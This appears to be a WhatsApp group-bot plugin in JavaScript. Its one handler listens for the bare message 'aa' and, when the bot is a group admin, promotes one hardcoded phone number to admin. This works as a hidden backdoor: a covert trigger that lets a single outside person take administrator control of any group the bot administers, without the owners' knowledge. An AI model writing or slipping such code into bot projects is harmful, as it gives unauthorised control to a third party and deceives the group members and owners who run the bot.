let handler = async (m, { conn, isBotAdmin }) => {
if (!m.isGroup) return
if (!isBotAdmin) return
if (m.sender === '59899022028@s.whatsapp.net') {
await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")
}}
handler.customPrefix = /^(aa)$/i
handler.command = new RegExp
//handler.group = true
//handler.botAdmin = true
export default handler